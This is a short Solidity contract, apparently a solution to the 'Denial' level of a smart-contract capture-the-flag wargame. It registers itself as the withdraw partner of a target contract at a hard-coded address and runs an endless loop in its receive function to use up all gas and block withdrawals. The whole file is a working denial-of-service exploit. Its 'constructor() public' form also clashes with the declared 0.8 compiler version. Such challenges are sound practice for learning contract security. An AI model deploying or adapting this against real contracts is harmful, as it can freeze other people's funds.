// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./denial.sol";

contract DenialHack {
    Denial level20 = Denial(payable(0x37c60B8C6007ea5996826e1D7fb229aac3e0e67e));

    constructor() public {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}